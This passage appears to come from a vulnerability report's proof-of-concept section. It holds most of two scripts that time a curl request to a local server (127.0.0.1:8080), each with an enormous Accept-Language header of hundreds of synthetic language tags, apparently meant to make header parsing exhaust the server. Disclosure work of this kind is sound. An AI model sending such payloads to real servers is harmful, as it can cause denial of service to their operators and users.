cdc;q=0.703, cdd;q=0.240, cde;q=0.101, cdf;q=0.029, cdg;q=0.925, cdh;q=0.332, cdi;q=0.673, cdj;q=0.032, cdk;q=0.342, cdl;q=0.120, cdm;q=0.971, cdn;q=0.754, cdo;q=0.797, cdp;q=0.450, cdq;q=0.613, cdr;q=0.839, cds;q=0.057, cdt;q=0.671, cdu;q=0.541, cdv;q=0.220, cdw;q=0.998, cdx;q=0.095, cdy;q=0.818, cdz;q=0.507, cea;q=0.668, ceb;q=0.479, cec;q=0.715, ced;q=0.270, cee;q=0.290, cef;q=0.658, ceg;q=0.203, ceh;q=0.714, cei;q=0.835, cej;q=0.869, cek;q=0.411, cel;q=0.863, cem;q=0.909, cen;q=0.561, ceo;q=0.370, cep;q=0.755, ceq;q=0.778, cer;q=0.423, ces;q=0.264, cet;q=0.402, ceu;q=0.532, cev;q=0.874, cew;q=0.993, cex;q=0.475, cey;q=0.886, cez;q=0.007, cfa;q=0.251, cfb;q=0.414, cfc;q=0.211, cfd;q=0.441, cfe;q=0.776, cff;q=0.391, cfg;q=0.552, cfh;q=0.560, cfi;q=0.759, cfj;q=0.520, cfk;q=0.040, cfl;q=0.606, cfm;q=0.556, cfn;q=0.658, cfo;q=0.350, cfp;q=0.023, cfq;q=0.902, cfr;q=0.218, cfs;q=0.632, cft;q=0.110, cfu;q=0.560, cfv;q=0.804, cfw;q=0.600, cfx;q=0.698, cfy;q=0.101, cfz;q=0.201, cga;q=0.411, cgb;q=0.527, cgc;q=0.989, cgd;q=0.122, cge;q=0.934, cgf;q=0.230, cgg;q=0.173, cgh;q=0.968, cgi;q=0.394, cgj;q=0.526, cgk;q=0.749, cgl;q=0.461, cgm;q=0.788, cgn;q=0.999, cgo;q=0.870, cgp;q=0.146, cgq;q=0.966, cgr;q=0.654, cgs;q=0.023, cgt;q=0.068, cgu;q=0.972, cgv;q=0.527, cgw;q=0.806, cgx;q=0.775, cgy;q=0.446, cgz;q=0.269, cha;q=0.602, chb;q=0.048, chc;q=0.234, chd;q=0.990, che;q=0.133, chf;q=0.877, chg;q=0.398, chh;q=0.107, chi;q=0.572, chj;q=0.621, chk;q=0.955, chl;q=0.795, chm;q=0.340, chn;q=0.084, cho;q=0.609, chp;q=0.310, chq;q=0.409, chr;q=0.557, chs;q=0.059, cht;q=0.599, chu;q=0.403, chv;q=0.684, chw;q=0.573, chx;q=0.186, chy;q=0.846, chz;q=0.842, cia;q=0.806, cib;q=0.254, cic;q=0.227, cid;q=0.437, cie;q=0.439, cif;q=0.952, cig;q=0.226, cih;q=0.482, cii;q=0.214, cij;q=0.274, cik;q=0.645, cil;q=0.246, cim;q=0.593, cin;q=0.785, cio;q=0.424, cip;q=0.464, ciq;q=0.745, cir;q=0.294, cis;q=0.585, cit;q=0.415, ciu;q=0.587, civ;q=0.362, ciw;q=0.569, cix;q=0.106, ciy;q=0.874, ciz;q=0.230, cja;q=0.426, cjb;q=0.011, cjc;q=0.496, cjd;q=0.462, cje;q=0.264, cjf;q=0.706, cjg;q=0.066, cjh;q=0.572, cji;q=0.941, cjj;q=0.544, cjk;q=0.307, cjl;q=0.670, cjm;q=0.080, cjn;q=0.842, cjo;q=0.001, cjp;q=0.635, cjq;q=0.339, cjr;q=0.689, cjs;q=0.775, cjt;q=0.543, cju;q=0.640, cjv;q=0.410, cjw;q=0.060, cjx;q=0.230, cjy;q=0.143, cjz;q=0.746, cka;q=0.444, ckb;q=0.760, ckc;q=0.493, ckd;q=0.712, cke;q=0.567, ckf;q=0.878, ckg;q=0.419, ckh;q=0.673, cki;q=0.987, ckj;q=0.554, ckk;q=0.058, ckl;q=0.196, ckm;q=0.970, ckn;q=0.503, cko;q=0.382, ckp;q=0.547, ckq;q=0.166, ckr;q=0.613, cks;q=0.856, ckt;q=0.390, cku;q=0.261, ckv;q=0.993, ckw;q=0.961, ckx;q=0.980, cky;q=0.718, ckz;q=0.567, cla;q=0.435, clb;q=0.251, clc;q=0.066, cld;q=0.163, cle;q=0.194, clf;q=0.228, clg;q=0.622, clh;q=0.050, cli;q=0.615, clj;q=0.357, clk;q=0.729, cll;q=0.270, clm;q=0.746, cln;q=0.948, clo;q=0.495, clp;q=0.562, clq;q=0.058, clr;q=0.482, cls;q=0.663, clt;q=0.171, clu;q=0.344, clv;q=0.640, clw;q=0.998, clx;q=0.649, cly;q=0.412, clz;q=0.279, cma;q=0.195, cmb;q=0.947, cmc;q=0.853, cmd;q=0.973, cme;q=0.007, cmf;q=0.509, cmg;q=0.704, cmh;q=0.936, cmi;q=0.687, cmj;q=0.782, cmk;q=0.256, cml;q=0.966, cmm;q=0.200, cmn;q=0.100, cmo;q=0.973, cmp;q=0.448, cmq;q=0.804, cmr;q=0.560, cms;q=0.458, cmt;q=0.477, cmu;q=0.195, cmv;q=0.986, cmw;q=0.241, cmx;q=0.961, cmy;q=0.117, cmz;q=0.287, cna;q=0.707, cnb;q=0.402, cnc;q=0.642, cnd;q=0.538, cne;q=0.919, cnf;q=0.024, cng;q=0.050, cnh;q=0.152, cni;q=0.709, cnj;q=0.516, cnk;q=0.929, cnl;q=0.774, cnm;q=0.818, cnn;q=0.833, cno;q=0.767, cnp;q=0.217, cnq;q=0.278, cnr;q=0.114, cns;q=0.816, cnt;q=0.757, cnu;q=0.999, cnv;q=0.906, cnw;q=0.361, cnx;q=0.130, cny;q=0.909, cnz;q=0.634, coa;q=0.654, cob;q=0.739, coc;q=0.012, cod;q=0.680, coe;q=0.947, cof;q=0.017, cog;q=0.916, coh;q=0.833, coi;q=0.496, coj;q=0.643, cok;q=0.237, col;q=0.798, com;q=0.485, con;q=0.006, coo;q=0.679, cop;q=0.054, coq;q=0.672, cor;q=0.996, cos;q=0.988, cot;q=0.799, cou;q=0.826, cov;q=0.507, cow;q=0.568, cox;q=0.895, coy;q=0.059, coz;q=0.617, cpa;q=0.971, cpb;q=0.376, cpc;q=0.297, cpd;q=0.581, cpe;q=0.138, cpf;q=0.012, cpg;q=0.464, cph;q=0.514, cpi;q=0.181, cpj;q=0.710, cpk;q=0.729, cpl;q=0.074, cpm;q=0.767, cpn;q=0.255, cpo;q=0.502, cpp;q=0.061, cpq;q=0.228, cpr;q=0.121, cps;q=0.124, cpt;q=0.545, cpu;q=0.292, cpv;q=0.235, cpw;q=0.324, cpx;q=0.567, cpy;q=0.548, cpz;q=0.243, cqa;q=0.760, cqb;q=0.116, cqc;q=0.460, cqd;q=0.105, cqe;q=0.111, cqf;q=0.208, cqg;q=0.234, cqh;q=0.631, cqi;q=0.918, cqj;q=0.445, cqk;q=0.337, cql;q=0.985, cqm;q=0.840, cqn;q=0.823, cqo;q=0.223, cqp;q=0.922, cqq;q=0.441, cqr;q=0.718, cqs;q=0.138, cqt;q=0.645, cqu;q=0.235, cqv;q=0.073, cqw;q=0.347, cqx;q=0.866, cqy;q=0.580, cqz;q=0.202, cra;q=0.109, crb;q=0.323, crc;q=0.667, crd;q=0.732, cre;q=0.884, crf;q=0.574, crg;q=0.783, crh;q=0.306, cri;q=0.822, crj;q=0.236, crk;q=0.969, crl;q=0.443, crm;q=0.792, crn;q=0.000, cro;q=0.880, crp;q=0.548, crq;q=0.892, crr;q=0.025, crs;q=0.899, crt;q=0.217, cru;q=0.285, crv;q=0.256, crw;q=0.656, crx;q=0.109, cry;q=0.193, crz;q=0.819, csa;q=0.846, csb;q=0.879, csc;q=0.154, csd;q=0.210, cse;q=0.456, csf;q=0.226, csg;q=0.235, csh;q=0.497, csi;q=0.878, csj;q=0.825, csk;q=0.758, csl;q=0.295, csm;q=0.451, csn;q=0.026, cso;q=0.728, csp;q=0.593, csq;q=0.585, csr;q=0.482, css;q=0.159, cst;q=0.971, csu;q=0.338, csv;q=0.439, csw;q=0.498, csx;q=0.206, csy;q=0.306, csz;q=0.147, cta;q=0.290, ctb;q=0.887, ctc;q=0.684, ctd;q=0.231, cte;q=0.572, ctf;q=0.887, ctg;q=0.120, cth;q=0.264, cti;q=0.127, ctj;q=0.280, ctk;q=0.477, ctl;q=0.146, ctm;q=0.328, ctn;q=0.512, cto;q=0.422, ctp;q=0.744, ctq;q=0.943, ctr;q=0.024, cts;q=0.142, ctt;q=0.122, ctu;q=0.140, ctv;q=0.464, ctw;q=0.980, ctx;q=0.499, cty;q=0.709, ctz;q=0.956, cua;q=0.234, cub;q=0.894, cuc;q=0.535, cud;q=0.448, cue;q=0.898, cuf;q=0.354, cug;q=0.265, cuh;q=0.232, cui;q=0.149, cuj;q=0.922, cuk;q=0.269, cul;q=0.674, cum;q=0.153, cun;q=0.020, cuo;q=0.117, cup;q=0.874, cuq;q=0.674, cur;q=0.514, cus;q=0.974, cut;q=0.603, cuu;q=0.666, cuv;q=0.998, cuw;q=0.390, cux;q=0.900, cuy;q=0.362, cuz;q=0.520, cva;q=0.655, cvb;q=0.167, cvc;q=0.152, cvd;q=0.018, cve;q=0.015, cvf;q=0.152, cvg;q=0.908, cvh;q=0.014, cvi;q=0.760, cvj;q=0.205, cvk;q=0.632, cvl;q=0.583, cvm;q=0.141, cvn;q=0.371, cvo;q=0.887, cvp;q=0.795, cvq;q=0.233, cvr;q=0.605, cvs;q=0.018, cvt;q=0.123, cvu;q=0.826, cvv;q=0.343, cvw;q=0.882, cvx;q=0.760, cvy;q=0.768, cvz;q=0.471, cwa;q=0.867, cwb;q=0.789, cwc;q=0.978, cwd;q=0.163, cwe;q=0.581, cwf;q=0.649, cwg;q=0.501, cwh;q=0.734, cwi;q=0.726, cwj;q=0.355, cwk;q=0.298, cwl;q=0.545, cwm;q=0.319, cwn;q=0.701, cwo;q=0.761, cwp;q=0.546, cwq;q=0.735, cwr;q=0.797, cws;q=0.826, cwt;q=0.792, cwu;q=0.225, cwv;q=0.846, cww;q=0.330, cwx;q=0.593, cwy;q=0.422, cwz;q=0.514, cxa;q=0.111, cxb;q=0.400, cxc;q=0.564, cxd;q=0.549, cxe;q=0.060, cxf;q=0.628, cxg;q=0.889, cxh;q=0.709, cxi;q=0.263, cxj;q=0.751'
&lt;/pre&gt;

==POC2==
&lt;pre&gt;
#!/bin/bash

time curl -m 120 "http://127.0.0.1:8080/" -H 'Accept-Language: aaa;q=0.341, aab;q=0.484, aac;q=0.093, aad;q=0.188, aae;q=0.173, aaf;q=0.748, aag;q=0.659, aah;q=0.411, aai;q=0.083, aaj;q=0.273, aak;q=0.771, aal;q=0.777, aam;q=0.583, aan;q=0.283, aao;q=0.756, aap;q=0.922, aaq;q=0.937, aar;q=0.124, aas;q=0.508, aat;q=0.958, aau;q=0.560, aav;q=0.132, aaw;q=0.558, aax;q=0.684, aay;q=0.037, aaz;q=0.009, aba;q=0.938, abb;q=0.800, abc;q=0.031, abd;q=0.383, abe;q=0.321, abf;q=0.197, abg;q=0.764, abh;q=0.478, abi;q=0.725, abj;q=0.339, abk;q=0.389, abl;q=0.245, abm;q=0.384, abn;q=0.051, abo;q=0.898, abp;q=0.976, abq;q=0.882, abr;q=0.568, abs;q=0.690, abt;q=0.046, abu;q=0.823, abv;q=0.959, abw;q=0.516, abx;q=0.606, aby;q=0.857, abz;q=0.291, aca;q=0.532, acb;q=0.794, acc;q=0.258, acd;q=0.963, ace;q=0.388, acf;q=0.610, acg;q=0.276, ach;q=0.726, aci;q=0.131, acj;q=0.107, ack;q=0.863, acl;q=0.095, acm;q=0.200, acn;q=0.001, aco;q=0.078, acp;q=0.850, acq;q=0.243, acr;q=0.515, acs;q=0.808, act;q=0.529, acu;q=0.784, acv;q=0.440, acw;q=0.880, acx;q=0.832, acy;q=0.578, acz;q=0.127, ada;q=0.388, adb;q=0.753, adc;q=0.126, add;q=0.813, ade;q=0.789, adf;q=0.619, adg;q=0.326, adh;q=0.807, adi;q=0.115, adj;q=0.647, adk;q=0.182, adl;q=0.878, adm;q=0.710, adn;q=0.537, ado;q=0.343, adp;q=0.943, adq;q=0.376, adr;q=0.992, ads;q=0.702, adt;q=0.789, adu;q=0.238, adv;q=0.436, adw;q=0.754, adx;q=0.386, ady;q=0.423, adz;q=0.084, aea;q=0.701, aeb;q=0.272, aec;q=0.496, aed;q=0.503, aee;q=0.907, aef;q=0.216, aeg;q=0.563, aeh;q=0.984, aei;q=0.696, aej;q=0.433, aek;q=0.893, ael;q=0.180, aem;q=0.809, aen;q=0.454, aeo;q=0.075, aep;q=0.036, aeq;q=0.969, aer;q=0.572, aes;q=0.608, aet;q=0.292, aeu;q=0.314, aev;q=0.011, aew;q=0.357, aex;q=0.037, aey;q=0.657, aez;q=0.951, afa;q=0.706, afb;q=0.357, afc;q=0.188, afd;q=0.423, afe;q=0.667, aff;q=0.862, afg;q=0.184, afh;q=0.961, afi;q=0.928, afj;q=0.517, afk;q=0.439, afl;q=0.346, afm;q=0.878, afn;q=0.834, afo;q=0.603, afp;q=0.869, afq;q=0.067, afr;q=0.542, afs;q=0.963, aft;q=0.494, afu;q=0.008, afv;q=0.022, afw;q=0.976, afx;q=0.812, afy;q=0.249, afz;q=0.701, aga;q=0.847, agb;q=0.194, agc;q=0.536, agd;q=0.003, age;q=0.528, agf;q=0.513, agg;q=0.837, agh;q=0.266, agi;q=0.424, agj;q=0.044, agk;q=0.051, agl;q=0.180, agm;q=0.320, agn;q=0.904, ago;q=0.627, agp;q=0.471, agq;q=0.914, agr;q=0.420, ags;q=0.296, agt;q=0.331, agu;q=0.914, agv;q=0.335, agw;q=0.712, agx;q=0.890, agy;q=0.791, agz;q=0.849, aha;q=0.629, ahb;q=0.406, ahc;q=0.905, ahd;q=0.824, ahe;q=0.501, ahf;q=0.936, ahg;q=0.908, ahh;q=0.137, ahi;q=0.618, ahj;q=0.887, ahk;q=0.013, ahl;q=0.316, ahm;q=0.540, ahn;q=0.999, aho;q=0.996, ahp;q=0.654, ahq;q=0.372, ahr;q=0.007, ahs;q=0.311, aht;q=0.694, ahu;q=0.047, ahv;q=0.852, ahw;q=0.825, ahx;q=0.515, ahy;q=0.752, ahz;q=0.246, aia;q=0.794, aib;q=0.723, aic;q=0.659, aid;q=0.132, aie;q=0.965, aif;q=0.249, aig;q=0.451, aih;q=0.785, aii;q=0.271, aij;q=0.595, aik;q=0.547, ail;q=0.306, aim;q=0.676, ain;q=0.791, aio;q=0.764, aip;q=0.754, aiq;q=0.598, air;q=0.939, ais;q=0.475, ait;q=0.705, aiu;q=0.972, aiv;q=0.960, aiw;q=0.205, aix;q=0.970, aiy;q=0.457, aiz;q=0.861, aja;q=0.461, ajb;q=0.542, ajc;q=0.831, ajd;q=0.223, aje;q=0.942, ajf;q=0.695, ajg;q=0.542, ajh;q=0.083, aji;q=0.230, ajj;q=0.821, ajk;q=0.278, ajl;q=0.411, ajm;q=0.872, ajn;q=0.697, ajo;q=0.115, ajp;q=0.425, ajq;q=0.166, ajr;q=0.602, ajs;q=0.927, ajt;q=0.933, aju;q=0.835, ajv;q=0.594, ajw;q=0.583, ajx;q=0.376, ajy;q=0.736, ajz;q=0.126, aka;q=0.160, akb;q=0.610, akc;q=0.032, akd;q=0.443, ake;q=0.417, akf;q=0.649, akg;q=0.667, akh;q=0.882, aki;q=0.876, akj;q=0.404, akk;q=0.834, akl;q=0.977, akm;q=0.183, akn;q=0.879, ako;q=0.958, akp;q=0.815, akq;q=0.661, akr;q=0.161, aks;q=0.551, akt;q=0.778, aku;q=0.667, akv;q=0.969, akw;q=0.431, akx;q=0.625, aky;q=0.815, akz;q=0.495, ala;q=0.754, alb;q=0.023, alc;q=0.475, ald;q=0.002, ale;q=0.958, alf;q=0.433, alg;q=0.043, alh;q=0.516, ali;q=0.661, alj;q=0.917, alk;q=0.088, all;q=0.246, alm;q=0.634, aln;q=0.879, alo;q=0.164, alp;q=0.651, alq;q=0.744, alr;q=0.685, als;q=0.580, alt;q=0.595, alu;q=0.347, alv;q=0.759, alw;q=0.906, alx;q=0.998, aly;q=0.985, alz;q=0.502, ama;q=0.806, amb;q=0.547, amc;q=0.704, amd;q=0.910, ame;q=0.159, amf;q=0.826, amg;q=0.761, amh;q=0.205, ami;q=0.090, amj;q=0.368, amk;q=0.693, aml;q=0.038, amm;q=0.503, amn;q=0.094, amo;q=0.471, amp;q=0.217, amq;q=0.539, amr;q=0.765, ams;q=0.597, amt;q=0.785, amu;q=0.880, amv;q=0.448, amw;q=0.672, amx;q=0.719, amy;q=0.742, amz;q=0.175, ana;q=0.881, anb;q=0.810, anc;q=0.056, and;q=0.101, ane;q=0.324, anf;q=0.199, ang;q=0.096, anh;q=0.847, ani;q=0.475, anj;q=0.785, ank;q=0.862, anl;q=0.881, anm;q=0.039, ann;q=0.453, ano;q=0.624, anp;q=0.804, anq;q=0.995, anr;q=0.274, ans;q=0.137, ant;q=0.729, anu;q=0.278, anv;q=0.027, anw;q=0.375, anx;q=0.876, any;q=0.672, anz;q=0.185, aoa;q=0.378, aob;q=0.407, aoc;q=0.747, aod;q=0.380, aoe;q=0.203, aof;q=0.517, aog;q=0.309, aoh;q=0.253, aoi;q=0.077, aoj;q=0.758, aok;q=0.214, aol;q=0.212, aom;q=0.947, aon;q=0.011, aoo;q=0.840, aop;q=0.847, aoq;q=0.262, aor;q=0.505, aos;q=0.187, aot;q=0.017, aou;q=0.692, aov;q=0.163, aow;q=0.323, aox;q=0.018, aoy;q=0.247, aoz;q=0.280, apa;q=0.309, apb;q=0.913, apc;q=0.199, apd;q=0.205, ape;q=0.044, apf;q=0.490, apg;q=0.566, aph;q=0.145, api;q=0.600, apj;q=0.976, apk;q=0.773, apl;q=0.270, apm;q=0.873, apn;q=0.375, apo;q=0.564, app;q=0.261, apq;q=0.327, apr;q=0.494, aps;q=0.177, apt;q=0.021, apu;q=0.434, apv;q=0.438, apw;q=0.439, apx;q=0.006, apy;q=0.082, apz;q=0.540, aqa;q=0.183, aqb;q=0.407, aqc;q=0.976, aqd;q=0.454, aqe;q=0.564, aqf;q=0.262, aqg;q=0.259, aqh;q=0.999, aqi;q=0.418, aqj;q=0.174, aqk;q=0.220, aql;q=0.970, aqm;q=0.242, aqn;q=0.612, aqo;q=0.622, aqp;q=0.634, aqq;q=0.716, aqr;q=0.218, aqs;q=0.257, aqt;q=0.616, aqu;q=0.641, aqv;q=0.077, aqw;q=0.436, aqx;q=0.823, aqy;q=0.099, aqz;q=0.912, ara;q=0.394, arb;q=0.524, arc;q=0.858, ard;q=0.683, are;q=0.975, arf;q=0.323, arg;q=0.591, arh;q=0.409, ari;q=0.250, arj;q=0.102, ark;q=0.253, arl;q=0.608, arm;q=0.294, arn;q=0.943, aro;q=0.570, arp;q=0.047, arq;q=0.055, arr;q=0.538, ars;q=0.051, art;q=0.716, aru;q=0.608, arv;q=0.288, arw;q=0.207, arx;q=0.052, ary;q=0.132, arz;q=0.500, asa;q=0.053, asb;q=0.801, asc;q=0.369, asd;q=0.373, ase;q=0.168, asf;q=0.986, asg;q=0.692, ash;q=0.698, asi;q=0.578, asj;q=0.051, ask;q=0.828, asl;q=0.341, asm;q=0.551, asn;q=0.417, aso;q=0.945, asp;q=0.655, asq;q=0.869, asr;q=0.865, ass;q=0.468, ast;q=0.621, asu;q=0.908, asv;q=0.183, asw;q=0.942, asx;q=0.605, asy;q=0.496, asz;q=0.873, ata;q=0.333, atb;q=0.343, atc;q=0.563, atd;q=0.081, ate;q=0.519, atf;q=0.156, atg;q=0.031, ath;q=0.637, ati;q=0.861, atj;q=0.533, atk;q=0.099, atl;q=0.692, atm;q=0.280, atn;q=0.776, ato;q=0.312, atp;q=0.963, atq;q=0.470, atr;q=0.880, ats;q=0.086, att;q=0.897, atu;q=0.974, atv;q=0.592, atw;q=0.554, atx;q=0.845, aty;q=0.307, atz;q=0.397, aua;q=0.109, aub;q=0.244, auc;q=0.409, aud;q=0.304, aue;q=0.734, auf;q=0.641, aug;q=0.472, auh;q=0.580, aui;q=0.332, auj;q=0.359, auk;q=0.856, aul;q=0.930, aum;q=0.855, aun;q=0.081, auo;q=0.458, aup;q=0.271, auq;q=0.726, aur;q=0.588, aus;q=0.514, aut;q=0.693, auu;q=0.239, auv;q=0.481, auw;q=0.564, aux;q=0.155, auy;q=0.931, auz;q=0.761, ava;q=0.994, avb;q=0.096, avc;q=0.958, avd;q=0.342, ave;q=0.927, avf;q=0.928, avg;q=0.481, avh;q=0.971, avi;q=0.309, avj;q=0.746, avk;q=0.583, avl;q=0.096, avm;q=0.889, avn;q=0.200, avo;q=0.428, avp;q=0.955, avq;q=0.386, avr;q=0.327, avs;q=0.739, avt;q=0.534, avu;q=0.105, avv;q=0.552, avw;q=0.154, avx;q=0.402, avy;q=0.731, avz;q=0.530, awa;q=0.710, awb;q=0.497, awc;q=0.743, awd;q=0.695, awe;q=0.887, awf;q=0.676, awg;q=0.662, awh;q=0.552, awi;q=0.122, awj;q=0.847, awk;q=0.662, awl;q=0.896, awm;q=0.356, awn;q=0.488, awo;q=0.863, awp;q=0.445, awq;q=0.581, awr;q=0.508, aws;q=0.683, awt;q=0.001, awu;q=0.861, awv;q=0.129, aww;q=0.885, awx;q=0.064, awy;q=0.802, awz;q=0.836, axa;q=0.780, axb;q=0.507, axc;q=0.790, axd;q=0.576, axe;q=0.817, axf;q=0.096, axg;q=0.650, axh;q=0.479, axi;q=0.554, axj;q=0.250, axk;q=0.821, axl;q=0.096, axm;q=0.011, axn;q=0.038, axo;q=0.651, axp;q=0.541, axq;q=0.121, axr;q=0.468, axs;q=0.563, axt;q=0.930, axu;q=0.838, axv;q=0.835, axw;q=0.975, axx;q=0.263, axy;q=0.186, axz;q=0.470, aya;q=0.610, ayb;q=0.016, ayc;q=0.979, ayd;q=0.852, aye;q=0.094, ayf;q=0.135, ayg;q=0.908, ayh;q=0.211, ayi;q=0.030, ayj;q=0.831, ayk;q=0.958, ayl;q=0.534, aym;q=0.479, ayn;q=0.544, ayo;q=0.334, ayp;q=0.318, ayq;q=0.894, ayr;q=0.557, ays;q=0.075, ayt;q=0.332, ayu;q=0.095, ayv;q=0.455, ayw;q=0.470, ayx;q=0.985, ayy;q=0.240, ayz;q=0.203, aza;q=0.857, azb;q=0.921, azc;q=0.914, azd;q=0.137, aze;q=0.964, azf;q=0.589, azg;q=0.242, azh;q=0.709, azi;q=0.385, azj;q=0.577, azk;q=0.328, azl;q=0.942, azm;q=0.516, azn;q=0.994, azo;q=0.126, azp;q=0.600, azq;q=0.774, azr;q=0.574, azs;q=0.966, azt;q=0.321, azu;q=0.641, azv;q=0.520, azw;q=0.315, azx;q=0.437, azy;q=0.368, azz;q=0.650, baa;q=0.935, bab;q=0.631, bac;q=0.937, bad;q=0.352, bae;q=0.271, baf;q=0.092, bag;q=0.649, bah;q=0.127, bai;q=0.898, baj;q=0.856, bak;q=0.935, bal;q=0.179, bam;q=0.448, ban;q=0.074, bao;q=0.192, bap;q=0.444, baq;q=0.106, bar;q=0.119, bas;q=0.199, bat;q=0.636, bau;q=0.688, bav;q=0.224, baw;q=0.166, bax;q=0.253, bay;q=0.788, baz;q=0.544, bba;q=0.412, bbb;q=0.465, bbc;q=0.362, bbd;q=0.402, bbe;q=0.163, bbf;q=0.295, bbg;q=0.587, bbh;q=0.594, bbi;q=0.575, bbj;q=0.634, bbk;q=0.504, bbl;q=0.750, bbm;q=0.396, bbn;q=0.076, bbo;q=0.540, bbp;q=0.498, bbq;q=0.570, bbr;q=0.957, bbs;q=0.341, bbt;q=0.089, bbu;q=0.841, bbv;q=0.222, bbw;q=0.980, bbx;q=0.673, bby;q=0.218, bbz;q=0.346, bca;q=0.588, bcb;q=0.275, bcc;q=0.395, bcd;q=0.708, bce;q=0.442, bcf;q=0.341, bcg;q=0.273, bch;q=0.222, bci;q=0.158, bcj;q=0.881, bck;q=0.069, bcl;q=0.142, bcm;q=0.006, bcn;q=0.998, bco;q=0.501, bcp;q=0.239, bcq;q=0.223, bcr;q=0.022, bcs;q=0.856, bct;q=0.210, bcu;q=0.743, bcv;q=0.168, bcw;q=0.726, bcx;q=0.322, bcy;q=0.664, bcz;q=0.199, bda;q=0.231, bdb;q=0.966, bdc;q=0.320, bdd;q=0.060, bde;q=0.384, bdf;q=0.748, bdg;q=0.643, bdh;q=0.480, bdi;q=0.211, bdj;q=0.859, bdk;q=0.431, bdl;q=0.094, bdm;q=0.803, bdn;q=0.951, bdo;q=0.674, bdp;q=0.200, bdq;q=0.776, bdr;q=0.776, bds;q=0.383, bdt;q=0.451, bdu;q=0.350, bdv;q=0.204, bdw;q=0.750, bdx;q=0.957, bdy;q=0.918, bdz;q=0.172, bea;q=0.825, beb;q=0.331, bec;q=0.932, bed;q=0.858, bee;q=0.887, bef;q=0.134, beg;q=0.697, beh;q=0.272, bei;q=0.281, bej;q=0.159, bek;q=0.319, bel;q=0.966, bem;q=0.807, ben;q=0.213, beo;q=0.090, bep;q=0.343, beq;q=0.704, ber;q=0.812, bes;q=0.145, bet;q=0.510, beu;q=0.131, bev;q=0.455, bew;q=0.968, bex;q=0.359, bey;q=0.369, bez;q=0.484, bfa;q=0.539, bfb;q=0.541, bfc;q=0.962, bfd;q=0.492, bfe;q=0.671, bff;q=0.579, bfg;q=0.696, bfh;q=0.198, bfi;q=0.081, bfj;q=0.310, bfk;q=0.891, bfl;q=0.352, bfm;q=0.291, bfn;q=0.614, bfo;q=0.536, bfp;q=0.572, bfq;q=0.278, bfr;q=0.144, bfs;q=0.233, bft;q=0.147, bfu;q=0.104, bfv;q=0.683, bfw;q=0.003, bfx;q=0.944, bfy;q=0.580, bfz;q=0.080, bga;q=0.408, bgb;q=0.162, bgc;q=0.464, bgd;q=0.929, bge;q=0.329, bgf;q=0.947, bgg;q=0.642, bgh;q=0.698, bgi;q=0.836, bgj;q=0.086, bgk;q=0.712, bgl;q=0.515, bgm;q=0.026, bgn;q=0.186, bgo;q=0.299, bgp;q=0.613, bgq;q=0.441, bgr;q=0.741, bgs;q=0.533, bgt;q=0.830, bgu;q=0.163, bgv;q=0.818, bgw;q=0.819, bgx;q=0.607, bgy;q=0.021, bgz;q=0.014, bha;q=0.461, bhb;q=0.392, bhc;q=0.681, bhd;q=0.933, bhe;q=0.210, bhf;q=0.539, bhg;q=0.473, bhh;q=0.109, bhi;q=0.220, bhj;q=0.428, bhk;q=0.262, bhl;q=0.879, bhm;q=0.383, bhn;q=0.866, bho;q=0.698, bhp;q=0.590, bhq;q=0.827, bhr;q=0.231, bhs;q=0.283, bht;q=0.019, bhu;q=0.702, bhv;q=0.692, bhw;q=0.787, bhx;q=0.882, bhy;q=0.889, bhz;q=0.690, bia;q=0.509, bib;q=0.117, bic;q=0.319, bid;q=0.017, bie;q=0.463, bif;q=0.458, big;q=0.614, bih;q=0.450, bii;q=0.966, bij;q=0.601, bik;q=0.722, bil;q=0.281, bim;q=0.034, bin;q=0.703, bio;q=0.899, bip;q=0.284, biq;q=0.948, bir;q=0.891, bis;q=0.269, bit;q=0.673, biu;q=0.515, biv;q=0.634, biw;q=0.330, bix;q=0.012, biy;q=0.324, biz;q=0.098, bja;q=0.498, bjb;q=0.228, bjc;q=0.712, bjd;q=0.249, bje;q=0.051, bjf;q=0.406, bjg;q=0.539, bjh;q=0.496, bji;q=0.330, bjj;q=0.329, bjk;q=0.479, bjl;q=0.168, bjm;q=0.145, bjn;q=0.434, bjo;q=0.004, bjp;q=0.891, bjq;q=0.890, bjr;q=0.863, bjs;q=0.347, bjt;q=0.600, bju;q=0.339, bjv;q=0.398, bjw;q=0.552, bjx;q=0.163, bjy;q=0.419, bjz;q=0.198, bka;q=0.095, bkb;q=0.962, bkc;q=0.540, bkd;q=0.279, bke;q=0.685, bkf;q=0.921, bkg;q=0.126, bkh;q=0.457, bki;q=0.174, bkj;q=0.581, bkk;q=0.611, bkl;q=0.858, bkm;q=0.466, bkn;q=0.443, bko;q=0.508, bkp;q=0.508, bkq;q=0.346, bkr;q=0.762, bks;q=0.080, bkt;q=0.072, bku;q=0.143, bkv;q=0.030, bkw;q=0.831, bkx;q=0.260, bky;q=0.808, bkz;q=0.789, bla;q=0.299, blb;q=0.719, blc;q=0.485, bld;q=0.797, ble;q=0.752, blf;q=0.118, blg;q=0.691, blh;q=0.081, bli;q=0.857, blj;q=0.182, blk;q=0.640, bll;q=0.638, blm;q=0.408, bln;q=0.971, blo;q=0.309, blp;q=0.074, blq;q=0.428, blr;q=0.225, bls;q=0.932, blt;q=0.512, blu;q=0.614, blv;q=0.175, blw;q=0.348, blx;q=0.798, bly;q=0.936, blz;q=0.636, bma;q=0.460, bmb;q=0.181, bmc;q=0.655, bmd;q=0.844, bme;q=0.216, bmf;q=0.600, bmg;q=0.889, bmh;q=0.260, bmi;q=0.557, bmj;q=0.990, bmk;q=0.993, bml;q=0.605, bmm;q=0.883, bmn;q=0.899, bmo;q=0.341, bmp;q=0.892, bmq;q=0.733, bmr;q=0.327, bms;q=0.195, bmt;q=0.350, bmu;q=0.803, bmv;q=0.817, bmw;q=0.154, bmx;q=0.882, bmy;q=0.122, bmz;q=0.729, bna;q=0.376, bnb;q=0.396, bnc;q=0.260, bnd;q=0.554, bne;q=0.419, bnf;q=0.043, bng;q=0.862, bnh;q=0.530, bni;q=0.204, bnj;q=0.994, bnk;q=0.991, bnl;q=0.249, bnm;q=0.423, bnn;q=0.306, bno;q=0.578, bnp;q=0.247, bnq;q=0.681, bnr;q=0.260, bns;q=0.499, bnt;q=0.345, bnu;q=0.992, bnv;q=0.404, bnw;q=0.353, bnx;q=0.368, bny;q=0.790, bnz;q=0.647, boa;q=0.823, bob;q=0.808, boc;q=0.391, bod;q=0.481, boe;q=0.710, bof;q=0.466, bog;q=0.758, boh;q=0.069, boi;q=0.949, boj;q=0.574, bok;q=0.181, bol;q=0.238, bom;q=0.050, bon;q=0.862, boo;q=0.744, bop;q=0.749, boq;q=0.244, bor;q=0.354, bos;q=0.449, bot;q=0.608, bou;q=0.393, 